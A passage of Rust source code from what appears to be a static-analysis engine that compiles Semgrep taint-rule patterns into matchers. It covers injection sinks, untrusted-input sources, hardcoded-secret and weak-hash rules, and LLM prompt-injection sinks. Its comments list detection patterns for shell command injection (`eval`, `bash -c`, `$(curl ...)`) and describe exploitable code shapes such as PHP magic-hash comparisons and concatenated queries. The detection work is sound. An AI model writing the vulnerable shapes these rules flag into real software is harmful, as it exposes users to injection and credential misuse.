        let after = &rest[idx + "string".len()..];
        // Require a word boundary after the keyword and a metavariable next.
        let trimmed = after.trim_start();
        if after.len() != trimmed.len() && trimmed.starts_with('$') && after.contains(';') {
            return true;
        }
        rest = &rest[idx + "string".len()..];
    }
    false
}

/// Recognise the C# `xpath-injection` concat-in-call SINK shape
/// `<Type|var> $EXPR = $NAV.Method("..." + $INPUT + "...");` and return the
/// method name (`Compile` / `Select` / `Evaluate`).
///
/// The RHS of the declaration/assignment must be a call `$RECV.METHOD(ARG)` on a
/// metavariable receiver whose argument `ARG` is a string CONCATENATION carrying
/// a metavariable (`"..." + $INPUT + "..."`). The concatenation is required (the
/// engine enforces it at match time too), so a direct `$NAV.Method($INPUT)` is
/// NOT recognised as this sink. Returns `None` for any other shape.
fn parse_csharp_concat_call_sink(pat: &str) -> Option<String> {
    let p = pat.trim().trim_end_matches(';').trim_end();
    // Split on the declaration/assignment `=` (`Type $EXPR = ...`).
    let eq = find_single_assignment(p)?;
    let rhs = p[eq + 1..].trim();
    // RHS must be a call on a metavariable receiver: `$RECV.METHOD(...)`.
    if !rhs.starts_with('$') || !rhs.ends_with(')') {
        return None;
    }
    let open = rhs.find('(')?;
    let callee = rhs[..open].trim();
    let dot = callee.rfind('.')?;
    let recv = callee[..dot].trim();
    let method = callee[dot + 1..].trim();
    if !is_metavariable(recv) || !is_identifier(method) {
        return None;
    }
    let args = rhs[open + 1..rhs.len() - 1].trim();
    // Faithful: the argument must be a string concatenation carrying a
    // metavariable — a `+`, a quoted literal, and a `$` metavariable operand.
    if args.contains('+') && args.contains('"') && args.contains('$') {
        return Some(method.to_string());
    }
    None
}

/// True when `pat` is a Swift "string built dynamically" source pattern:
///
/// - an interpolated string literal `"...\($X)..."` (contains `\(` and `$`);
/// - a concatenation assigned to a variable, `$SQL = "..." + $X` or
///   `$SQL = $X + "..."` (a `=` LHS metavariable, a `+`, a quoted literal, and
///   a metavariable operand).
///
/// These compile to the Swift string-construction sentinel source.
fn is_swift_string_construction_source(pat: &str) -> bool {
    let p = pat.trim();
    // Interpolated string literal: `"...\($X)..."`.
    if p.starts_with('"') && p.contains("\\(") && p.contains('$') {
        return true;
    }
    // Concatenation assignment: `$VAR = "..." + $X` / `$VAR = $X + "..."`.
    if let Some(eq) = find_single_assignment(p) {
        let rhs = p[eq + 1..].trim();
        if rhs.contains('+') && rhs.contains('"') && rhs.contains('$') {
            return true;
        }
    }
    false
}

/// Recognise an Apex chained-call request source of the form
/// `ROOT.<...calls...>.method($MV)` — a method chain rooted at a concrete
/// identifier (`ApexPage`, `RestContext`, …), whose final `.method($MV)` reads
/// a request value into a metavariable. Returns the canonical `ROOT.method`
/// pair, or `None`.
///
/// Examples:
/// - `ApexPage.getCurrentPage().getParameters().get($URLPARAM)`
///   → `Some("ApexPage.get")`
/// - `ApexPage.getCurrentPage().getParameters.get($URLPARAM)`
///   → `Some("ApexPage.get")`
fn parse_apex_chained_call_source(pat: &str) -> Option<String> {
    let p = pat.trim();
    // Must end with a call whose argument list references a metavariable.
    if !p.ends_with(')') {
        return None;
    }
    let open = p.find('(')?;
    // The callee text is everything before the FIRST `(` in a left-to-right
    // chain — but here the first `(` belongs to an intermediate call, so we
    // instead split on the final `.method(` boundary.
    let last_call_open = p.rfind('(')?;
    let callee_chain = p[..last_call_open].trim();
    // Final method name = segment after the last `.` in the callee chain.
    let method = callee_chain.rsplit('.').next()?;
    if method.is_empty()
        || !method
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_')
    {
        return None;
    }
    // Root identifier = leading identifier before the first `.` or `(`.
    let root_end = callee_chain.find(['.', '(']).unwrap_or(callee_chain.len());
    let root = callee_chain[..root_end].trim();
    if root.is_empty() || !root.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return None;
    }
    // Require an intermediate call chain (so a plain `root.method(...)` keeps
    // going through the normal Call branch, not this Apex-specific one).
    let has_inner_call = open < last_call_open;
    if !has_inner_call {
        return None;
    }
    // The argument list must reference a metavariable (the focused URL param).
    let args = &p[last_call_open + 1..p.len() - 1];
    if !args.contains('$') {
        return None;
    }
    Some(format!("{root}.{method}"))
}

/// Compile a single Semgrep pattern string into a [`NodeMatcher`].
///
/// Returns `None` if the pattern shape is not one of the supported forms
/// (see module docs). Callers surface that as a skip-with-warning at the
/// rule level.
/// True when `pat` is exactly Semgrep's ellipsis-string literal `"..."` (or the
/// single-quoted `'...'`) — the any-string-literal source metavariable. This is
/// deliberately strict: a string pattern carrying content (`"secret"`,
/// `"...key..."`) is a concrete/partial-value match, NOT the any-literal source,
/// so it must not compile to a `LiteralString` (which would over-match).
fn is_ellipsis_string_literal(pat: &str) -> bool {
    let t = pat.trim();
    t == "\"...\"" || t == "'...'"
}

/// True when `pat` is a Go byte-slice conversion of an ANY-string-literal
/// metavariable — `[]byte("$F")` / `[]byte("...")` (and the back-quoted
/// variants). The Go `hardcoded-jwt-key` rule expresses its taint SOURCE this
/// way (`pattern-inside: []byte("$F")` — "a hardcoded `[]byte("...")` literal
/// is the untrusted key material"). The wrapped literal is any string (the
/// `$F` / `...` placeholder is not a concrete value), so this compiles to a
/// [`GenericMatcher::LiteralString`] (seed every string literal); the specific
/// `.SignedString(...)` sink bounds it. A concrete inner value (`[]byte("abc")`)
/// is NOT this shape (that would be a literal-value match) and returns `false`.
fn is_go_bytes_string_literal_source(pat: &str) -> bool {
    let t = pat.trim();
    let Some(inner) = t.strip_prefix("[]byte(").and_then(|s| s.strip_suffix(')')) else {
        return false;
    };
    let inner = inner.trim();
    let content = if let Some(c) = inner.strip_prefix('"').and_then(|s| s.strip_suffix('"')) {
        c
    } else if let Some(c) = inner.strip_prefix('`').and_then(|s| s.strip_suffix('`')) {
        c
    } else {
        return false;
    };
    let content = content.trim();
    content == "..." || is_metavariable(content)
}

/// Try to recognise the Go `[]byte("$F")` byte-slice-literal SOURCE shape inside
/// a `patterns:` source block, where it appears as a `pattern-inside:` (the
/// `hardcoded-jwt-key` form) or a bare `pattern:`. On recognition pushes one
/// [`GenericMatcher::LiteralString`] (any string literal) and returns `true`.
/// Gated to Go + Source role. Returns `false` (pushing nothing) for any other
/// shape, leaving the caller to fall through to graceful degradation.
fn try_compile_go_bytes_literal_source_block(
    v: &YamlValue,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    if lang != Language::Go {
        return false;
    }
    let Some(items) = v.as_sequence() else {
        return false;
    };
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            if matches!(k.as_str(), Some("pattern") | Some("pattern-inside")) {
                if let Some(text) = val.as_str() {
                    if is_go_bytes_string_literal_source(text) {
                        out.push(GenericMatcher::LiteralString {
                            description: "hardcoded `[]byte(\"...\")` string literal".to_string(),
                            regex: None,
                        });
                        return true;
                    }
                }
            }
        }
    }
    false
}

fn compile_pattern(pattern: &str, role: MatcherRole, lang: Language) -> Option<GenericMatcher> {
    let mut pat = pattern.trim();
    if pat.is_empty() {
        return None;
    }

    // Solidity / Apex / PHP statement patterns carry a trailing `;` (e.g.
    // `selfdestruct(...);`, `Database.query($SINK,...);`,
    // `req.setHeader($X, ...);`, `print($...VARS);`). Strip it so the
    // call/member shapes below recognise them.
    if matches!(lang, Language::Solidity | Language::Apex | Language::Php) {
        pat = pat.trim_end_matches(';').trim_end();
    }

    // ── Ellipsis-string SOURCE: bare `"..."` (any string literal) ──────────
    //
    // Semgrep's `pattern: "..."` is the any-string-literal metavariable: "a
    // string literal is the taint source". The hardcoded-secret family (boto3
    // `hardcoded-token`, and the JS jwt/passport rules) uses it to seed every
    // literal string as tainted so that a hardcoded credential reaching a
    // signer/crypto/credential sink fires. We compile ONLY the exact
    // ellipsis-string forms `"..."` / `'...'` (not string patterns carrying
    // content, which would be a concrete-value match, and not other shapes) to
    // a `LiteralString` source. Source role only — a literal is a taint
    // origin, not a destination; in sink/sanitizer position a bare string has
    // no data-flow node to bind and is left unhandled.
    if let MatcherRole::Source = role {
        if is_ellipsis_string_literal(pat) {
            return Some(GenericMatcher::LiteralString {
                description: "hardcoded string literal".to_string(),
                regex: None,
            });
        }
    }

    // ── JS/TS inline literal-argument call SOURCE: `$RECV.method("<arg>")` ──
    //
    // The `md5-used-as-password` source `$CRYPTO.createHash("md5")`: a method
    // call whose single argument is a string literal. None of the generic
    // call/field shapes recognise a metavariable-receiver call with a concrete
    // literal argument, so this would otherwise skip. We compile it to a
    // [`GenericMatcher::LiteralArgCall`] keyed by the method name and the
    // literal argument; the JS engine seeds the call result tainted and its
    // method-chain propagation carries it through `.update(...).digest(...)` to
    // the password sink. The literal-argument discriminator ("md5") keeps
    // `createHash("sha256")` clean. Source role only, gated to JS (the JS engine
    // also serves TS; the only registry rule with this inline shape is JS).
    if let MatcherRole::Source = role {
        if lang == Language::JavaScript {
            if let Some((method, arg)) = parse_js_literal_arg_call_source(pat) {
                return Some(GenericMatcher::LiteralArgCall {
                    description: format!("value derived from `.{method}(\"{arg}\")`"),
                    method,
                    arg,
                });
            }
        }
    }

    // ── Swift string-construction source: `"...\($X)..."`, `$SQL = "..." + $X`,
    //    `$SQL = $X + "..."` ───────────────────────────────────────────────
    //
    // The Swift `swift-potential-sqlite-injection` rule expresses its source as
    // a string assembled by interpolation or by concatenation with a dynamic
    // operand — the constructed string is itself the (low-confidence) taint
    // origin (there is no parameter binding). None of the generic call/param/
    // field shapes recognise these, so we compile them to a sentinel
    // `ParamName` source that the Swift engine interprets as "any interpolated
    // or concatenated string is tainted" (see
    // `swift_taint::STRING_CONSTRUCTION_SENTINEL`). Source role only.
    if lang == Language::Swift {
        if let MatcherRole::Source = role {
            if is_swift_string_construction_source(pat) {
                return Some(GenericMatcher::ParamName {
                    names: vec![swift_taint::STRING_CONSTRUCTION_SENTINEL.to_string()],
                    description: "dynamically constructed string".to_string(),
                });
            }
        }
    }

    // ── Apex chained-call request source: `ROOT.....method($MV)` ────────────
    //
    // Apex SOQL-injection rules read the inbound request parameter via a method
    // chain, e.g. `ApexPage.getCurrentPage().getParameters().get($URLPARAM)`.
    // None of the generic call shapes recognise a callee whose receiver itself
    // contains call parens, so this would otherwise skip. We compile it to a
    // `Call { canonical: "ROOT.method" }` keyed by the leading root identifier
    // and the final method name; the Apex engine matches a `method_invocation`
    // whose final method equals `method` and whose receiver chain contains
    // `ROOT` (so `ApexPage.getCurrentPage()....get(...)` matches `ApexPage.get`).
    // Source role only.
    if lang == Language::Apex {
        if let MatcherRole::Source = role {
            if let Some(canonical) = parse_apex_chained_call_source(pat) {
                return Some(GenericMatcher::Call {
                    description: format!("untrusted `{canonical}` request input"),
                    canonical,
                });
            }
        }
    }

    // ── Java typed-metavariable shape: `(Type $MV)` [ .member / .call ] ────
    //
    // Semgrep's "typed metavariable" binds `$MV` to a declared type, e.g.
    //   `(HttpServletRequest $REQ)`            — any variable of that type
    //   `(HttpServletRequest $REQ).$FUNC(...)` — a read off such a variable
    //   `(javax.servlet.ServletRequest $R).getParameter(...)`
    // ~7 Java registry taint rules express their `pattern-sources` this way
    // ("input from an HttpServletRequest is untrusted"), and several express
    // their sinks as a call on a typed receiver (`(XPath $XP).evaluate(...)`).
    //
    // SOURCE: compile to a `TypedName { type_name }` matcher; the Java engine
    // seeds every parameter / local of that declared type as tainted. A
    // trailing `.method(...)` (and any `metavariable-regex` pinning that method)
    // is a droppable narrowing — seeding the typed variable and propagating
    // through reads on it covers `(Type $REQ).$FUNC(...)` faithfully, and stays
    // type-specific (NOT "seed all params"), preserving precision.
    //
    // SINK / SANITIZER: the declared type is a droppable constraint, so we strip
    // the `(Type ...)` annotation to a bare metavariable receiver and re-compile
    // `$MV.method(...)` through the normal call/member path (yielding a
    // `MethodName` / `Call` matcher). A bare `(Type $MV)` with no trailing chain
    // has no expressible sink node shape and is skipped (deferred).
    //
    // Gated to Java and C#: this parenthesised-type syntax is shared by both
    // (Go uses a different `($X : *pkg.Type)` colon form — see COMPATIBILITY.md).
    // C# expresses `csharp-sqli`'s `pattern-sources` as `(string $X)` ("any
    // variable of declared type `string` is untrusted"), the exact same shape
    // as Java's `(HttpServletRequest $REQ)`. The C# engine seeds every
    // parameter / local of the named declared type (see `csharp_taint.rs`),
    // staying type-specific (a differently-typed variable is NOT seeded).
    if lang == Language::Java || lang == Language::CSharp {
        if let Some((type_text, metavar, remainder)) = parse_typed_metavar(pat) {
            let type_seg = type_final_segment(type_text);
            match role {
                MatcherRole::Source => {
                    return Some(GenericMatcher::TypedName {
                        type_name: type_seg.to_string(),
                        description: format!("untrusted `{type_seg}` typed value"),
                    });
                }
                MatcherRole::Sink | MatcherRole::Sanitizer => {
                    let rem = remainder.trim();
                    // Typed-ASSIGNMENT sink `(java.io.File $FILE) = ...`: the
                    // whole `(Type $MV)` is the assignment/declaration target,
                    // so a tainted value written into a variable of that type
                    // is the sink. Detect a leading single `=` (not `==`, a
                    // comparison) and compile a type-specific
                    // `TypedAssignTarget`. The RHS (`...`) is Semgrep's
                    // ellipsis; the engine's own tainted-RHS check is what
                    // bounds the match (never a bare `x = y`).
                    if let Some(rhs) = rem.strip_prefix('=') {
                        if !rhs.starts_with('=') {
                            return Some(GenericMatcher::TypedAssignTarget {
                                type_name: type_seg.to_string(),
                                description: format!(
                                    "tainted value assigned to `{type_seg}` variable"
                                ),
                            });
                        }
                    }
                    if rem.is_empty() {
                        // Bare `(Type $MV)` sink — no node shape to match on.
                        return None;
                    }
                    let rewritten = format!("{metavar}{rem}");
                    return compile_pattern(&rewritten, role, lang);
                }
            }
        }
    }

    // ── C# method-signature SOURCE + concat-in-call SINK (xpath-injection) ───
    //
    // The C# `xpath-injection` rule expresses BOTH its sources and its sink in
    // shapes no generic recognizer handles:
    //
    //   pattern-sources:
    //     - $T $M($INPUT,...) {...}          # the method's FIRST param is a source
    //     - $T $M(...) { ... string $INPUT; } # a local `string` decl is a source
    //   pattern-sinks:
    //     - <Type|var> $EXPR = $NAV.Compile("..." + $INPUT + "...");   (also
    //       .Select / .Evaluate)
    //
    // SOURCE: the first-parameter signature compiles to
    // [`GenericMatcher::FirstParamSource`] (seed only the first parameter). The
    // local-`string` signature compiles to the SAME typed-string source
    // (`TypedName { "string" }`) that `csharp-sqli`'s `(string $X)` already uses —
    // "a `string` variable is untrusted" — a precedented, type-specific seeding.
    //
    // SINK: `$NAV.Method("..." + $INPUT + "...")` compiles to
    // [`GenericMatcher::CallArgConcat`], keyed by the method name. The engine
    // fires only when the method matches AND a `+`-concatenation argument carries
    // taint — a direct `nav.Compile(input)` (no concat) is NOT a match, so the
    // broad first-parameter source stays precise at the sink. Gated to C#.
    if lang == Language::CSharp {
        match role {
            MatcherRole::Source => {
                if let Some(kind) = parse_csharp_signature_source(pat) {
                    return Some(match kind {
                        CsharpSignatureSource::FirstParam => GenericMatcher::FirstParamSource {
                            description: "method's first parameter (untrusted input)".to_string(),
                        },
                        CsharpSignatureSource::LocalString => GenericMatcher::TypedName {
                            type_name: "string".to_string(),
                            description: "local `string` variable (untrusted input)".to_string(),
                        },
                    });
                }
            }
            MatcherRole::Sink | MatcherRole::Sanitizer => {
                if let Some(method) = parse_csharp_concat_call_sink(pat) {
                    let description =
                        format!("XPath query built by concatenation into `.{method}(...)`");
                    return Some(GenericMatcher::CallArgConcat {
                        method,
                        description,
                    });
                }
            }
        }
    }

    // ── Go colon-syntax typed-metavariable shape: `($MV : Type)` [ .$FIELD ] ─
    //
    // Go's typed metavariable puts the metavariable FIRST and the type SECOND,
    // separated by `:` — `($REQUEST : *http.Request).$ANYTHING` means "any
    // field/method read off a variable declared `*http.Request`". Four Go
    // registry taint rules (`tainted-url-host`, `open-redirect`,
    // `gorm-dangerous-method-usage`, `filepath-clean-misuse`) express their
    // `pattern-sources` this way ("input from an *http.Request is untrusted").
    //
    // SOURCE: compile to a `TypedName { type_name }` matcher normalized to the
    // pointer-stripped, package-qualified type (`*http.Request` → `http.Request`);
    // the Go engine seeds every parameter / local of that declared type as
    // tainted, and the trailing `.$FIELD` read propagates through the existing
    // attribute/selector handling. This stays type-specific (NOT "seed all
    // params" — the metavariable-regex pinning `$ANYTHING` is a droppable
    // narrowing), preserving precision at the gated sink.
    //
    // SINK / SANITIZER: the declared type is a droppable constraint. A trailing
    // chain is re-compiled as `$MV{remainder}` through the normal call/member
    // path; a bare `($X : bool)` (a gorm sanitizer) has no expressible node
    // shape and is skipped (dropped as an over-broadening constraint, not a
    // rule-level failure).
    //
    // Gated to Go: this colon syntax is Go-specific (Java uses the
    // parenthesised `(Type $MV)` form handled above).
    if lang == Language::Go {
        // Go `[]byte("$F")` byte-slice-literal source (also reachable as a bare
        // `pattern:`): a hardcoded byte-slice key is any string literal.
        if let MatcherRole::Source = role {
            if is_go_bytes_string_literal_source(pat) {
                return Some(GenericMatcher::LiteralString {
                    description: "hardcoded `[]byte(\"...\")` string literal".to_string(),
                    regex: None,
                });
            }
        }
        if let Some((type_text, metavar, remainder)) = parse_go_typed_metavar(pat) {
            let type_name = normalize_go_type(type_text);
            match role {
                MatcherRole::Source => {
                    return Some(GenericMatcher::TypedName {
                        description: format!("untrusted `{type_name}` typed value"),
                        type_name,
                    });
                }
                MatcherRole::Sink | MatcherRole::Sanitizer => {
                    let rem = remainder.trim();
                    if rem.is_empty() {
                        return None;
                    }
                    let rewritten = format!("{metavar}{rem}");
                    return compile_pattern(&rewritten, role, lang);
                }
            }
        }
    }

    // ── Bash command / command-substitution shapes ───────────────────────
    //
    // Bash taint rules express sources and sinks as shell commands rather than
    // call expressions, so none of the generic shapes below recognise them.
    // We map a shell command (or command substitution) to a `Call` matcher
    // keyed by the *command name*, which the Bash engine interprets in its own
    // node vocabulary (`command` / `command_substitution`). Examples:
    //   `$(curl ...)`        → Call { "curl" }   (command-substitution source)
    //   `$(cat | jq ...)`    → Call { "cat" }    (first command in a pipeline)
    //   `$VAR=$(... | jq ...)` → Call { "jq" }   (assignment from a pipeline)
    //   `eval ...`           → Call { "eval" }   (command sink)
    //   `cat $SINK`          → Call { "cat" }    (command sink)
    //   `bash -c $...SINK`   → Call { "bash" }   (command sink)
    //   `realpath ...`       → Call { "realpath" } (sanitizer)
    if lang == Language::Bash {
        if let Some(m) = compile_bash_pattern(pat, role) {
            return Some(m);
        }
    }

    // ── Function-signature source: `function $F(..., type $X, ...) public {...}`
    //    (Solidity) / `def $C(..., $P: $T, ...) = ...` (Scala) ───────────────
    //
    // Several Solidity and Scala taint rules express their source as "a
    // parameter of a public/external function" via a full function-signature
    // pattern. None of the generic call/attribute shapes recognise these, so
    // they would otherwise compile to nothing and skip the rule. We compile
    // such a signature to a metavariable [`GenericMatcher::ParamName`] (a name
    // beginning with `$`), which the Solidity / Scala engines interpret as
    // "seed every parameter of the enclosing function as tainted" — matching
    // Semgrep's any-parameter semantics. Source role only.
    if matches!(lang, Language::Solidity | Language::Scala) {
        if let MatcherRole::Source = role {
            if is_function_signature_source(pat) {
                return Some(GenericMatcher::ParamName {
                    names: vec!["$PARAM".to_string()],
                    description: "untrusted function parameter".to_string(),
                });
            }
        }
    }

    // ── ObjectLiteralValue form: tainted value in an object/dict literal ──
    //
    // LLM system-prompt-injection rules (`openai`/`mistral`) express their sink
    // as an object/dict literal whose value field carries tainted text:
    //   `{role: "system", content: $SINK}`        (JS object literal)
    //   `{"role": "system", "content": $SINK}`    (Python dict)
    // The bridge compiles these to an `ObjectLiteralValue` sink; the JS/Python
    // engines fire only when an object/dict literal is actually constructed AND
    // a tainted value reaches one of its value positions. Sink/sanitizer only —
    // a literal construction is a data-flow destination, not a taint origin.
    if is_object_literal_value_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => {
                Some(GenericMatcher::ObjectLiteralValue {
                    description: describe(pat, role),
                })
            }
            MatcherRole::Source => None,
        };
    }

    // ── ReturnValue form: `return $METAVAR` (tainted return value) ────────
    //
    // LLM "unsanitized return" and Flask directly-returned-format rules express
    // their sink as a `return` statement returning a tainted value:
    //   `return $SINK`   /   `return $X`
    // The bridge compiles these to a `ReturnValue` sink; the Python engine fires
    // only when a `return` statement actually returns a tainted value. Bounded
    // to return position (NOT a universal bare-metavar sink). Sink/sanitizer
    // only — a return is a data-flow destination, not a taint origin.
    if let Some(()) = parse_return_metavar(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::ReturnValue {
                description: describe(pat, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── Python string-construction SOURCE: `$X + $Y`, `$X % $Y`, `f"..."`,
    //    `$X.format(...)` (sqlalchemy `avoid-sqlalchemy-text`, `twiml-injection`) ─
    //
    // A handful of Python taint rules treat a *dynamically constructed* string as
    // their taint origin — the assembled SQL / markup is itself the untrusted
    // thing, regardless of whether a tracked source flowed into it:
    //   `"a" + user` / `user + "b"`   (concatenation with a string literal)
    //   `user % x`                    (old-style `%` formatting)
    //   `f"...{user}..."`             (f-string interpolation)
    //   `"...".format(user)`          (str.format)
    // Each alternative carries a `metavariable-type: string` narrowing which we
    // drop; in its place we require a concrete string LITERAL operand / an
    // f-string / a literal `.format` receiver, which is STRICTER than Semgrep's
    // type check (we never seed pure numeric arithmetic or non-string values), so
    // the compiled source stays FP-safe. We reuse the existing `BinopFormat`
    // matcher — carried by every engine's `NodeMatcher`, so no new variant — and
    // the Python engine's `match_source` recognises the construction node and
    // seeds it. Gated to Python + source role so no other language's rules change
    // behaviour (their string-construction sources stay deferred, as before).
    if lang == Language::Python {
        if let MatcherRole::Source = role {
            if is_python_string_construction_source(pat) {
                return Some(GenericMatcher::BinopFormat {
                    description: describe(pat, role),
                });
            }
        }
    }

    // ── LooseEquality form: `$VAR1 == $VAR2` / `$VAR1 != $VAR2` (PHP) ─────
    //
    // The PHP `md5-loose-equality` rule expresses its sink as a loose-equality
    // comparison of two metavariables. When a hash-family value (`md5(...)`,
    // `hash(...)`, `sha1(...)`, …) reaches a loose `==`/`!=` comparison, PHP's
    // type-juggling allows a "magic hash" bypass — the fix is a strict
    // `===`/`!==`. The bridge compiles the loose comparison to a
    // `LooseEquality` sink; the PHP engine fires only when the comparison uses
    // the LOOSE operator (`==`/`!=`, never the strict `===`/`!==`) AND one
    // operand carries taint. Gated to PHP + sink/sanitizer role: type-juggling
    // is PHP-specific, and a comparison is a data-flow destination, not a taint
    // origin.
    if lang == Language::Php && is_loose_equality_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::LooseEquality {
                description: describe(pat, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── BinopFormat form: string-building sinks ──────────────────────────
    //
    // Semgrep SQL/command-string sinks express tainted concatenation as a
    // binary `+`/`%` expression or an f-string interpolation: `"$SQL" + $EXPR`,
    // `$A + $B`, `$M % $M`, `f"...{$X}..."`. The bridge compiles these to a
    // `BinopFormat` sink; the engine fires only when one operand is a string
    // literal/format AND another operand is tainted, so a literal-only or
    // numeric concatenation never fires (conservative — avoids FPs).
    //
    // Sink/sanitizer only — a concatenation is a data-flow destination, and the
    // `BinopFormat` literal-guard makes it nonsensical as a taint origin.
    if is_binop_format_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::BinopFormat {
                description: describe(pat, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── Subscript form: `base[...]` / `base[$K]` ─────────────────────────
    //
    // Semgrep taint rules express request-map indexing as a subscript:
    // `params[...]`, `cookies[...]`, `request.POST[...]`,
    // `flask.request.args[...]`, `$VALS[$INDEX]`, `$M[$K]`. The bridge
    // compiles these to `Subscript { base }`, where `base` is the final
    // identifier segment before the `[` (or `None` for a metavariable base).
    //
    // Detection: the pattern ends with `]`, contains a `[`, and the portion
    // before the first `[` is a recognizable base (plain identifier, dotted
    // attribute chain, or a metavariable / metavariable-tailed chain). No
    // top-level `=` (that is a MemberAssign) and the base must not itself be
    // a call. Valid as a source, sink, or sanitizer.
    if let Some(base) = parse_subscript_base(pat) {
        let desc = match &base {
            Some(b) => describe(b, role),
            None => describe(pat, role),
        };
        return Some(GenericMatcher::Subscript {
            base,
            description: desc,
        });
    }

    // ── MemberAssign form: `$METAVAR.field = $X` ────────────────────────
    //
    // Semgrep taint rules for DOM-XSS commonly express property-assignment
    // sinks as `$EL.innerHTML = $X`, `$EL.outerHTML = $X`, etc.  The bridge
    // compiles these to `MemberAssign { field }`, which the JavaScript engine
    // matches against any assignment whose LHS property name equals `field`.
    //
    // Detection: the pattern contains ` = ` (single `=`, not `==`), and the
    // LHS parses as `$METAVAR.plain_field` with no call parens.
    //
    // Only valid as a sink or sanitizer shape — not a source, since a
    // property assignment is a data-flow destination, not an origin.
    if let Some(field) = parse_member_assign_pattern(pat) {
        return match role {
            MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::MemberAssign {
                field: field.to_string(),
                description: describe(field, role),
            }),
            MatcherRole::Source => None,
        };
    }

    // ── Ruby constant scope-resolution SOURCE: `Digest::MD5` ────────────────
    //
    // The `md5-used-as-password` rule names its source as the bare constant path
    // `Digest::MD5` (a `Const::Const` reference whose `.hexdigest`/`.new` output
    // is the weak password hash). `is_dotted_identifier` rejects the `::`, so it
    // would otherwise skip and the rule loses all its sources. We compile it to a
    // `Call { canonical }` source; the Ruby engine matches a `scope_resolution`
    // node by EXACT text, so `Digest::SHA256` stays silent (the md5
    // discriminator) — the taint then propagates through the constant's method
    // reads. Source role only — a constant reference is a taint origin, not a
    // data-flow destination; gated to Ruby (constant `::` paths are Ruby syntax).
    if lang == Language::Ruby {
        if let MatcherRole::Source = role {
            if is_ruby_constant_path(pat) {
                return Some(GenericMatcher::Call {
                    canonical: pat.to_string(),
                    description: describe(pat, role),
                });
            }
        }
    }

    // ── Paren-less "command" call: `echo $...VARS`, `send_file ...` ──────
    //
    // Ruby and PHP allow calling a function/command without parentheses:
    //   `echo $...VARS`   (PHP echo statement)
    //   `print $...VARS`  (PHP print intrinsic)
    //   `send_file ...`   (Ruby command call)
    // None of the paren-based shapes above recognise these (there is no `(`),
    // so they fall through and skip the rule. We compile them to the same
    // `Call { canonical }` matcher the parenthesised call form produces — the
    // taint engine fires when a tainted value reaches any argument of the
    // named call, which the Ruby / PHP engines already match (PHP has native
    // `echo`/`print` Call sinks; the Ruby engine resolves bare command calls
    // like `system x`).
    //
    // Discipline (faithfulness): we only accept a WHOLE-ARGS command call —
    // the argument list is exactly the `...` ellipsis, a single metavariable
    // (`$X`), or a PHP variadic metavariable (`$...VARS`). This matches the
    // existing "call form strips arguments and fires on any tainted arg"
    // semantics. We deliberately REJECT keyworded / positional-specific
    // command calls such as `render ..., file: $X` (a comma-separated or
    // `key:`-tagged arg list), because compiling those to a bare `Call` would
    // fire on argument positions the original rule never named — an
    // over-match. Gated to Ruby / PHP, the only supported taint languages
    // with paren-less call syntax.
    if matches!(lang, Language::Ruby | Language::Php) {
        if let Some(callee) = parse_command_call(pat) {
            return Some(GenericMatcher::Call {
                canonical: callee.to_string(),
                description: describe(callee, role),
            });
        }
    }

    // ── Call form: `root.method(...)` or `func($X)` ─────────────────────
    if let Some(open_paren) = pat.find('(') {
        if !pat.ends_with(')') {
            return None;
        }
        let callee = pat[..open_paren].trim();
        if callee.is_empty() {
            return None;
        }

        // ── C# object-creation form: `new AesGcm(...)` ──────────────────
        //
        // A `new Type(...)` constructor call has a `new ` prefix on the callee,
        // so `is_dotted_identifier("new AesGcm")` fails (the space) and the
        // Call branch below refuses it — the reason the crypto-primitive sinks
        // `new AesGcm(...)` / `new AesCcm(...)` / `new ChaCha20Poly1305(...)` in
        // `use_weak_rng_for_keygeneration` never loaded. The C# engine matches an
        // `object_creation_expression` by its declared TYPE text against a `Call`
        // canonical, so we compile `new Type(...)` to `Call { canonical: Type }`.
        // Gated to C# (the `new Type(...)` constructor-sink shape) — for other
        // languages a `new ...` callee stays refused.
        if lang == Language::CSharp {
            if let Some(type_name) = callee.strip_prefix("new ") {
                let type_name = type_name.trim();
                if is_dotted_identifier(type_name) {
                    return Some(GenericMatcher::Call {
                        canonical: type_name.to_string(),
                        description: describe(type_name, role),
                    });
                }
            }
        }

        // ── MethodName shape: `$METAVAR.method($X)` ─────────────────────
        //
        // When the callee is `$VAR.method` — a single metavariable segment
        // followed by exactly one plain identifier — we compile to
        // `MethodName { method }`, which the engine matches against the
        // *final* segment of any resolved callee regardless of receiver.
        //
        // This covers the common Semgrep pattern shape used for OOP sinks
        // like `$CONN.executeQuery($X)`, `$OBJ.innerHTML`, etc., that are
        // currently warn-skipped because the `$`-prefixed segment fails the
        // `is_dotted_identifier` check.
        //
        // Only meaningful as a sink/sanitizer shape (matching any receiver),
        // not a source.
        if let Some(method) = parse_metavar_dot_method(callee) {
            return match role {
                MatcherRole::Sink | MatcherRole::Sanitizer => Some(GenericMatcher::MethodName {
                    method: method.to_string(),
                    description: describe(method, role),
                }),
                MatcherRole::Source => None,
            };
        }

        // ── CALL-ON-MEMBER shape: `<root>.<field>.method($X)` ──────────────
        //
        // A method call whose receiver is itself a member-access chain with a
        // metavariable somewhere (so it is NOT a fully-concrete dotted path,
        // which the `Call` branch already handles). Examples:
        //   `$CLIENT.chat.completions.create(...)` → field `completions`
        //   `$CLIENT.messages.create(...)`         → field `messages`
        //   `$REQ.POST.get(...)`                   → field `POST`
        //
        // The compiled matcher is a `FieldName` on the *penultimate* segment
        // (the field read immediately before the final method). The engine
        // taints that member-read; the trailing `.method(...)` propagates the
        // taint via the existing method-call-on-tainted-root rule. This reuses
        // the FieldName machinery with no new engine variant.
        //
        // Discipline: we only accept this when the penultimate segment is a
        // *concrete* identifier (so we never compile a bare `.get(...)` /
        // `.method(...)` any-receiver matcher, which would be far too broad).
        // The root may be a metavariable or a concrete identifier; any
